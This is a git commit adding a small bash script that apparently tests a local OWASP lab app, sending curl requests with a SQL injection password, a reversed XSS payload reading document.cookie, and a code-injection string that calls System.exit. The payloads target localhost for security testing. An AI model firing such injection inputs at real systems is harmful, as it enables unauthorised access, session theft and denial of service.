970200abcfe7e071f72dc902c98096c9fb718880
laamaai <maiderp1a@gmail.com>
2022-05-25 16:35:08 +0200

    owasp

--- owasp.sh
+++ owasp.sh
@@ -1,1 +1,10 @@
-sudo curl -X POST -F 'name=Mark' -F 'password=password' http://localhost:8080
+#!/bin/bash
+#SQL Injection
+curl -X POST -d "name=mark&password=' OR '1'='1" http://localhost:8080/sqlijc > sql1.html
+curl -X POST -d "name=Mark&password=password" http://localhost:8080/sqlijc > sql2.html
+
+#XSS
+curl -X POST -d "string= >tpircs/<;)eikooc.tnemucod(trela>tpIrcs<" http://localhost:8080/xss > xss.html
+
+#Code Injection
+curl -X POST -d "jsonString={}');java.lang.System.exit(0);//" http://localhost:8080/codeijc > codeijc.html
